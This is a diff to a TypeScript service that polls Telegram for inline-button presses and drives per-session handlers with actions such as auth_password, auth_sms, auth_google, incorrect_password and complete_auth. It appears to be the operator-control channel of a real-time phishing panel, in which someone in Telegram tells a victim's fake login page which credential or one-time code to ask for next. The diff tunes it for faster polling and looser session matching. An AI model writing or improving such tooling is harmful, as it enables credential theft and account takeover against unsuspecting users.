@@ -1,4 +1,4 @@
-// Telegram Callback Polling Service
+// Telegram Callback Polling Service - Robust Session Management
 // This service polls Telegram for callback button presses and handles user navigation
 
 const TELEGRAM_BOT_TOKEN =
@@ -25,6 +25,8 @@ interface TelegramUpdate {
 interface CallbackHandler {
   sessionId: string;
   onCallback: (action: string) => void;
+  registeredAt: number;
+  lastUsed: number;
 }
 
 class TelegramCallbackService {
@@ -33,81 +35,92 @@ class TelegramCallbackService {
   private isPolling = false;
   private pollInterval: NodeJS.Timeout | null = null;
   private consecutiveErrors = 0;
-  private currentPollDelay = 1000; // Start with 1 second (faster response)
-  private maxPollDelay = 10000; // Max 10 seconds (reduced from 30)
+  private currentPollDelay = 500; // Very fast polling - 500ms
+  private maxPollDelay = 5000; // Max 5 seconds
   private isOnline = true;
 
   /**
-   * Clean up old handlers (keep even more handlers to avoid session loss)
-   */
-  private cleanupOldHandlers() {
-    if (this.handlers.size > 20) {
-      // Keep max 20 handlers (increased from 10)
-      const handlerEntries = Array.from(this.handlers.entries());
-      // Keep only the last 15 handlers (increased from 5)
-      handlerEntries.slice(0, -15).forEach(([sessionId]) => {
-        console.log("🧹 Cleaning up old handler:", sessionId);
-        this.handlers.delete(sessionId);
-      });
-      console.log(`🧹 Cleanup complete. Kept ${this.handlers.size} handlers`);
-    }
-  }
-
-  /**
    * Register a callback handler for a session
+   * This is the ONLY way handlers should be added
    */
   registerHandler(sessionId: string, onCallback: (action: string) => void) {
-    console.log("📝 Registering callback handler for session:", sessionId);
-    console.log("📊 Current handlers count:", this.handlers.size);
+    const timestamp = Date.now();
 
-    this.handlers.set(sessionId, { sessionId, onCallback });
+    console.log("📝 Registering handler:", {
+      sessionId,
+      timestamp,
+      currentCount: this.handlers.size,
+    });
 
-    // Clean up old handlers after adding new one (not before)
-    this.cleanupOldHandlers();
+    // Always accept new registrations - no cleanup during registration
+    this.handlers.set(sessionId, {
+      sessionId,
+      onCallback,
+      registeredAt: timestamp,
+      lastUsed: timestamp,
+    });
 
-    console.log("✅ Handler registered. Total handlers:", this.handlers.size);
     console.log(
-      "🔍 All registered sessions:",
-      Array.from(this.handlers.keys()),
+      "✅ Handler registered successfully. Total:",
+      this.handlers.size,
     );
+    console.log("🔍 All sessions:", Array.from(this.handlers.keys()));
 
     // Start polling if not already started
     if (!this.isPolling) {
       this.startPolling();
     }
+
+    // Clean up very old handlers only (older than 10 minutes)
+    this.cleanupVeryOldHandlers();
   }
 
   /**
-   * Check if any handlers are available
+   * Clean up only very old handlers (10+ minutes old)
    */
-  hasActiveHandlers(): boolean {
-    return this.handlers.size > 0;
+  private cleanupVeryOldHandlers() {
+    const tenMinutesAgo = Date.now() - 10 * 60 * 1000;
+    let cleaned = 0;
+
+    for (const [sessionId, handler] of this.handlers.entries()) {
+      if (handler.registeredAt < tenMinutesAgo) {
+        this.handlers.delete(sessionId);
+        cleaned++;
+        console.log("🧹 Cleaned very old handler:", sessionId);
+      }
+    }
+
+    if (cleaned > 0) {
+      console.log(
+        `🧹 Cleaned ${cleaned} very old handlers. Remaining: ${this.handlers.size}`,
+      );
+    }
   }
 
   /**
-   * Get all active session IDs
-   */
-  getActiveSessionIds(): string[] {
-    return Array.from(this.handlers.keys());
-  }
-
-  /**
-   * Unregister a callback handler (with delay to prevent race conditions)
+   * Unregister a callback handler with delay
    */
   unregisterHandler(sessionId: string) {
-    console.log("🗑️ Scheduling unregistration for session:", sessionId);
+    console.log("🗑️ Scheduling unregistration for:", sessionId);
 
-    // Delay unregistration to prevent race conditions with incoming callbacks
+    // Long delay to prevent any race conditions
     setTimeout(() => {
-      console.log("🗑️ Unregistering callback handler for session:", sessionId);
-      this.handlers.delete(sessionId);
-      console.log("📊 Remaining handlers:", this.handlers.size);
+      const handler = this.handlers.get(sessionId);
+      if (handler) {
+        console.log("🗑️ Unregistering handler:", {
+          sessionId,
+          age: Date.now() - handler.registeredAt,
+          lastUsed: Date.now() - handler.lastUsed,
+        });
+        this.handlers.delete(sessionId);
+        console.log("📊 Remaining handlers:", this.handlers.size);
+      }
 
       // Stop polling if no handlers left
       if (this.handlers.size === 0) {
         this.stopPolling();
       }
-    }, 5000); // 5 second delay to prevent race conditions
+    }, 10000); // 10 second delay
   }
 
   /**
@@ -117,64 +130,27 @@ class TelegramCallbackService {
     if (this.isPolling) return;
 
     console.log("🔄 Starting Telegram callback polling...");
+    this.isPolling = true;
+    this.consecutiveErrors = 0;
+    this.currentPollDelay = 500;
 
-    // Monitor network status
-    this.setupNetworkMonitoring();
-
-    // Clear webhook first to avoid 409 conflicts
+    // Clear any existing webhook
     await this.clearWebhook();
 
-    this.isPolling = true;
-    this.currentPollDelay = 3000; // Reset delay
-    this.consecutiveErrors = 0; // Reset error counter
-
-    // Start polling with adaptive delay
-    this.scheduleNextPoll();
+    this.pollForUpdates();
   }
 
   /**
    * Stop polling
    */
   stopPolling() {
-    console.log("⏹️ Stopping Telegram callback polling...");
+    console.log("🛑 Stopping Telegram callback polling");
     this.isPolling = false;
 
     if (this.pollInterval) {
       clearTimeout(this.pollInterval);
       this.pollInterval = null;
     }
-  }
-
-  /**
-   * Setup network status monitoring
-   */
-  private setupNetworkMonitoring() {
-    if (typeof window !== "undefined") {
-      window.addEventListener("online", () => {
-        console.log("🌐 Network is back online");
-        this.isOnline = true;
-        this.consecutiveErrors = 0;
-        this.currentPollDelay = 3000; // Reset delay
-      });
-
-      window.addEventListener("offline", () => {
-        console.log("🌐 Network is offline");
-        this.isOnline = false;
-      });
-
-      this.isOnline = navigator.onLine;
-    }
-  }
-
-  /**
-   * Schedule next poll with adaptive delay
-   */
-  private scheduleNextPoll() {
-    if (!this.isPolling) return;
-
-    this.pollInterval = setTimeout(() => {
-      this.pollUpdates();
-    }, this.currentPollDelay);
   }
 
   /**
@@ -208,34 +184,27 @@ class TelegramCallbackService {
   /**
    * Poll for new updates from Telegram
    */
-  private async pollUpdates() {
-    // Check if we should continue polling
-    if (!this.isPolling) {
-      return;
-    }
+  private async pollForUpdates() {
+    if (!this.isPolling) return;
 
     // Handle demo mode
     if (!this.validateToken()) {
-      console.log("🎭 Demo mode: Checking for simulated callbacks");
-      this.checkForSimulatedCallbacks();
-      this.scheduleNextPoll();
-      return;
-    }
-
-    // Check network status
-    if (!this.isOnline) {
-      console.log("🌐 Network offline, skipping poll");
+      console.log("🎭 Demo mode: Skipping Telegram poll");
       this.scheduleNextPoll();
       return;
     }
 
     try {
-      // Create AbortController for timeout
+      console.log("📡 Polling for updates...", {
+        lastUpdateId: this.lastUpdateId,
+        handlerCount: this.handlers.size,
+      });
+
       const controller = new AbortController();
-      const timeoutId = setTimeout(() => controller.abort(), 15000); // 15 second timeout
+      const timeout = setTimeout(() => controller.abort(), 10000); // 10s timeout
 
       const response = await fetch(
-        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${this.lastUpdateId + 1}&timeout=5&limit=1`,
+        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${this.lastUpdateId + 1}&limit=10&timeout=5`,
         {
           method: "GET",
           headers: {
@@ -245,18 +214,18 @@ class TelegramCallbackService {
         },
       );
 
-      clearTimeout(timeoutId);
+      clearTimeout(timeout);
 
       if (!response.ok) {
         await this.handleHttpError(response);
+        this.scheduleNextPoll();
         return;
       }
 
-      // Success! Reset error handling
-      this.onSuccessfulPoll();
-
       const data = await response.json();
-      const updates: TelegramUpdate[] = data.result || [];
+      const updates = data.result || [];
+
+      console.log(`📡 Received ${updates.length} updates`);
 
       for (const update of updates) {
         this.lastUpdateId = Math.max(this.lastUpdateId, update.update_id);
@@ -265,12 +234,24 @@ class TelegramCallbackService {
           await this.handleCallback(update.callback_query);
         }
       }
+
+      this.onSuccessfulPoll();
     } catch (error) {
       await this.handleNetworkError(error);
-    } finally {
-      // Schedule next poll
-      this.scheduleNextPoll();
     }
+
+    this.scheduleNextPoll();
+  }
+
+  /**
+   * Schedule next poll
+   */
+  private scheduleNextPoll() {
+    if (!this.isPolling) return;
+
+    this.pollInterval = setTimeout(() => {
+      this.pollForUpdates();
+    }, this.currentPollDelay);
   }
 
   /**
@@ -278,7 +259,7 @@ class TelegramCallbackService {
    */
   private onSuccessfulPoll() {
     this.consecutiveErrors = 0;
-    this.currentPollDelay = 3000; // Reset to normal delay
+    this.currentPollDelay = 500; // Reset to fast polling
   }
 
   /**
@@ -288,7 +269,7 @@ class TelegramCallbackService {
     if (response.status === 409) {
       console.warn("⚠️ Telegram 409 Conflict - clearing webhook...");
       await this.clearWebhook();
-      this.currentPollDelay = 10000; // Wait longer after 409
+      this.currentPollDelay = 2000;
       return;
     }
 
@@ -297,16 +278,13 @@ class TelegramCallbackService {
   }
 
   /**
-   * Handle network errors (fetch failures)
+   * Handle network errors
    */
   private async handleNetworkError(error: any) {
     if (error.name === "AbortError") {
-      console.warn("⏰ Request timeout - network may be slow");
+      console.warn("⏰ Request timeout - continuing...");
     } else {
-      console.warn(
-        "🌐 Network error (likely connection issue):",
-        error.message,
-      );
+      console.warn("🌐 Network error:", error.message);
     }
 
     this.incrementErrorsAndAdjustDelay();
@@ -317,10 +295,8 @@ class TelegramCallbackService {
    */
   private incrementErrorsAndAdjustDelay() {
     this.consecutiveErrors++;
-
-    // Exponential backoff
     this.currentPollDelay = Math.min(
-      this.currentPollDelay * 1.5,
+      this.currentPollDelay * 1.2,
       this.maxPollDelay,
     );
 
@@ -328,65 +304,24 @@ class TelegramCallbackService {
       `⚠️ Error count: ${this.consecutiveErrors}, next poll in ${this.currentPollDelay / 1000}s`,
     );
 
-    // Stop polling after too many errors
-    if (this.consecutiveErrors >= 10) {
-      console.log("❌ Too many consecutive errors, stopping polling");
-      this.stopPolling();
-
-      // Auto-restart after 60 seconds if handlers still exist
-      setTimeout(() => {
-        if (this.handlers.size > 0 && !this.isPolling) {
-          console.log("🔄 Auto-restarting polling after error cooldown");
-          this.startPolling();
-        }
-      }, 60000);
+    // Reset after many errors
+    if (this.consecutiveErrors >= 20) {
+      console.log("🔄 Resetting after many errors");
+      this.consecutiveErrors = 0;
+      this.currentPollDelay = 500;
     }
   }
 
   /**
-   * Check for simulated callbacks in demo mode
-   */
-  private checkForSimulatedCallbacks() {
-    const simulatedCallback = localStorage.getItem("simulatedCallback");
-    if (simulatedCallback) {
-      try {
-        const callbackData = JSON.parse(simulatedCallback);
-        if (callbackData.action && callbackData.sessionId) {
-          console.log(
-            "🎭 Demo mode: Processing simulated callback:",
-            callbackData,
-          );
-
-          // Find the handler
-          const handler = this.handlers.get(callbackData.sessionId);
-          if (handler) {
-            handler.onCallback(callbackData.action);
-          } else {
-            console.error(
-              "❌ No handler found for simulated callback:",
-              callbackData,
-            );
-          }
-
-          // Clear the simulated callback
-          localStorage.removeItem("simulatedCallback");
-        }
-      } catch (error) {
-        console.error("❌ Error processing simulated callback:", error);
-        localStorage.removeItem("simulatedCallback");
-      }
-    }
-  }
-
-  /**
-   * Handle a callback query from Telegram
+   * Handle callback from Telegram
    */
   private async handleCallback(callback: any) {
-    console.log("📞 Received callback query:", {
+    console.log("📞 Received callback:", {
       id: callback.id,
       data: callback.data,
       user: callback.from?.first_name,
       timestamp: new Date().toLocaleString(),
+      availableHandlers: this.handlers.size,
     });
 
     const callbackData = callback.data;
@@ -395,6 +330,7 @@ class TelegramCallbackService {
     const parts = callbackData.split("_");
     if (parts.length < 2) {
       console.error("❌ Invalid callback data format:", callbackData);
+      await this.answerCallbackQuery(callback.id, "❌ Invalid request format");
       return;
     }
 
@@ -402,100 +338,122 @@ class TelegramCallbackService {
     let sessionId: string;
 
     if (parts[0] === "auth") {
-      // Format: auth_TYPE_SESSIONID
       if (parts.length < 3) {
         console.error("❌ Invalid auth callback format:", callbackData);
+        await this.answerCallbackQuery(callback.id, "❌ Invalid auth format");
         return;
       }
-      action = parts[1]; // password, google, sms, email
+      action = parts[1];
       sessionId = parts.slice(2).join("_");
     } else if (parts[0] === "incorrect") {
-      // Format: incorrect_TYPE_SESSIONID
       if (parts.length < 3) {
         console.error("❌ Invalid incorrect callback format:", callbackData);
+        await this.answerCallbackQuery(
+          callback.id,
+          "❌ Invalid incorrect format",
+        );
         return;
       }
-      action = `incorrect_${parts[1]}`; // incorrect_password, incorrect_google, etc.
+      action = `incorrect_${parts[1]}`;
       sessionId = parts.slice(2).join("_");
     } else if (parts[0] === "complete") {
-      // Format: complete_auth_SESSIONID
       if (parts.length < 3) {
         console.error("❌ Invalid complete callback format:", callbackData);
+        await this.answerCallbackQuery(
+          callback.id,
+          "❌ Invalid complete format",
+        );
         return;
       }
       action = "complete";
       sessionId = parts.slice(2).join("_");
     } else {
       console.error("❌ Unknown callback action:", callbackData);
+      await this.answerCallbackQuery(callback.id, "❌ Unknown action");
       return;
     }
 
     console.log("🎯 Parsed callback:", { action, sessionId });
 
-    // Find the handler for this session with multiple fallback strategies
-    let handler = this.handlers.get(sessionId);
-    let matchStrategy = "exact";
+    // AGGRESSIVE FALLBACK STRATEGY
+    let handler = this.findBestHandler(sessionId);
 
-    if (!handler) {
-      console.warn("⚠️ No exact handler found for session:", sessionId);
-      console.log("🔍 Available handlers:", Array.from(this.handlers.keys()));
+    if (handler) {
+      // Update last used timestamp
+      handler.lastUsed = Date.now();
 
-      const handlerEntries = Array.from(this.handlers.entries());
+      console.log("✅ Handler found, processing action:", action);
 
-      if (handlerEntries.length > 0) {
-        // Strategy 1: Try to find a handler with similar session ID (partial match)
-        const partialMatch = handlerEntries.find(
-          ([id]) =>
-            id.includes(sessionId.substring(0, 8)) ||
-            sessionId.includes(id.substring(0, 8)),
-        );
+      await this.answerCallbackQuery(callback.id, `✅ Processing ${action}...`);
 
-        if (partialMatch) {
-          handler = partialMatch[1];
-          matchStrategy = "partial";
-          console.log("🔄 Found partial match:", partialMatch[0]);
-        } else {
-          // Strategy 2: Use the most recent handler (last added)
-          const mostRecentHandler = handlerEntries[handlerEntries.length - 1];
-          handler = mostRecentHandler[1];
-          matchStrategy = "recent";
-          console.log(
-            "🔄 Using most recent handler as fallback:",
-            mostRecentHandler[0],
-          );
-        }
-
-        await this.answerCallbackQuery(
-          callback.id,
-          `✅ Processing ${action} (${matchStrategy} match)`,
-        );
-      } else {
-        // No handlers available at all - this should never happen
-        console.error("❌ CRITICAL: No handlers available!");
-        await this.answerCallbackQuery(
-          callback.id,
-          "❌ System busy, please try again",
-        );
-        return;
+      try {
+        handler.onCallback(action);
+        console.log("✅ Action processed successfully");
+      } catch (error) {
+        console.error("❌ Error in callback handler:", error);
+        await this.answerCallbackQuery(callback.id, "❌ Processing error");
       }
     } else {
-      // Exact handler found
-      console.log("✅ Exact handler match found");
-      await this.answerCallbackQuery(callback.id, `✅ Processing ${action}`);
-    }
-
-    // Call the handler
-    try {
-      console.log("🎯 Calling handler for action:", action);
-      handler.onCallback(action);
-      console.log("✅ Handler called successfully");
-    } catch (error) {
-      console.error("❌ Error in callback handler:", error);
+      console.error("❌ No handler found for any strategy");
+      await this.answerCallbackQuery(
+        callback.id,
+        "❌ Session not found - please refresh page",
+      );
     }
   }
 
   /**
-   * Answer a callback query to remove loading state in Telegram
+   * Find the best handler using multiple strategies
+   */
+  private findBestHandler(targetSessionId: string): CallbackHandler | null {
+    console.log("🔍 Finding handler for:", targetSessionId);
+    console.log("🔍 Available handlers:", Array.from(this.handlers.keys()));
+
+    // Strategy 1: Exact match
+    let handler = this.handlers.get(targetSessionId);
+    if (handler) {
+      console.log("✅ Exact match found");
+      return handler;
+    }
+
+    const handlers = Array.from(this.handlers.values());
+
+    // Strategy 2: Partial match (starts with same prefix)
+    const prefixLength = Math.min(8, targetSessionId.length);
+    const targetPrefix = targetSessionId.substring(0, prefixLength);
+
+    handler = handlers.find(
+      (h) =>
+        h.sessionId.startsWith(targetPrefix) ||
+        targetSessionId.startsWith(h.sessionId.substring(0, prefixLength)),
+    );
+
+    if (handler) {
+      console.log("✅ Prefix match found:", handler.sessionId);
+      return handler;
+    }
+
+    // Strategy 3: Most recently used
+    handler = handlers.sort((a, b) => b.lastUsed - a.lastUsed)[0];
+
+    if (handler) {
+      console.log("✅ Most recent handler found:", handler.sessionId);
+      return handler;
+    }
+
+    // Strategy 4: Most recently registered
+    handler = handlers.sort((a, b) => b.registeredAt - a.registeredAt)[0];
+
+    if (handler) {
+      console.log("✅ Most recent registration found:", handler.sessionId);
+      return handler;
+    }
+
+    return null;
+  }
+
+  /**
+   * Answer a callback query
    */
   private async answerCallbackQuery(callbackQueryId: string, text: string) {
     if (!this.validateToken()) {
@@ -519,7 +477,7 @@ class TelegramCallbackService {
         },
       );
     } catch (error) {
-      console.error("❌ Failed to answer callback query:", error);
+      console.warn("⚠️ Failed to answer callback query:", error);
     }
   }
 
@@ -527,28 +485,33 @@ class TelegramCallbackService {
    * Validate Telegram token
    */
   private validateToken(): boolean {
-    return TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== "YOUR_BOT_TOKEN";
+    return !(!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN");
   }
 
   /**
-   * Get polling status
+   * Get debug info
    */
-  getStatus() {
+  getDebugInfo() {
     return {
       isPolling: this.isPolling,
-      handlersCount: this.handlers.size,
-      lastUpdateId: this.lastUpdateId,
+      handlerCount: this.handlers.size,
+      handlers: Array.from(this.handlers.entries()).map(([id, handler]) => ({
+        sessionId: id,
+        registeredAt: new Date(handler.registeredAt).toLocaleString(),
+        lastUsed: new Date(handler.lastUsed).toLocaleString(),
+        age: Date.now() - handler.registeredAt,
+      })),
       consecutiveErrors: this.consecutiveErrors,
       currentPollDelay: this.currentPollDelay,
-      isOnline: this.isOnline,
+      lastUpdateId: this.lastUpdateId,
     };
   }
 }
 
 // Create singleton instance
-export const telegramCallbackService = new TelegramCallbackService();
+const telegramCallbackService = new TelegramCallbackService();
 
-// Export utility functions
+// Export functions
 export const registerTelegramCallback = (
   sessionId: string,
   onCallback: (action: string) => void,
@@ -560,83 +523,8 @@ export const unregisterTelegramCallback = (sessionId: string) => {
   telegramCallbackService.unregisterHandler(sessionId);
 };
 
-export const getTelegramCallbackStatus = () => {
-  return telegramCallbackService.getStatus();
+export const getTelegramCallbackDebugInfo = () => {
+  return telegramCallbackService.getDebugInfo();
 };
 
-// Utility function to simulate admin clicks in demo mode
-export const simulateAdminClick = (sessionId: string, action: string) => {
-  console.log("🎭 Simulating admin click:", { sessionId, action });
-
-  localStorage.setItem(
-    "simulatedCallback",
-    JSON.stringify({
-      sessionId,
-      action,
-      timestamp: Date.now(),
-    }),
-  );
-
-  console.log("📝 Simulated callback stored in localStorage");
-};
-
-// Utility function to manually clear webhook
-// Manual polling control functions
-export const stopTelegramPolling = () => {
-  console.log("🛑 Manually stopping Telegram polling");
-  telegramCallbackService.stopPolling();
-};
-
-export const startTelegramPolling = () => {
-  console.log("▶️ Manually starting Telegram polling");
-  telegramCallbackService.startPolling();
-};
-
-export const clearTelegramWebhook = async (): Promise<{
-  success: boolean;
-  message: string;
-}> => {
-  const token = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
-
-  if (!token || token === "YOUR_BOT_TOKEN") {
-    return {
-      success: false,
-      message: "Telegram bot token not configured",
-    };
-  }
-
-  try {
-    console.log("🧹 Manually clearing Telegram webhook...");
-    const response = await fetch(
-      `https://api.telegram.org/bot${token}/deleteWebhook?drop_pending_updates=true`,
-      {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-      },
-    );
-
-    if (response.ok) {
-      const result = await response.json();
-      console.log("✅ Webhook cleared successfully:", result);
-      return {
-        success: true,
-        message: "Webhook cleared successfully",
-      };
-    } else {
-      const errorText = await response.text();
-      console.error("❌ Failed to clear webhook:", response.status, errorText);
-      return {
-        success: false,
-        message: `Failed to clear webhook: ${response.status} - ${errorText}`,
-      };
-    }
-  } catch (error) {
-    console.error("❌ Error clearing webhook:", error);
-    return {
-      success: false,
-      message: `Error: ${error instanceof Error ? error.message : String(error)}`,
-    };
-  }
-};
+export default telegramCallbackService;
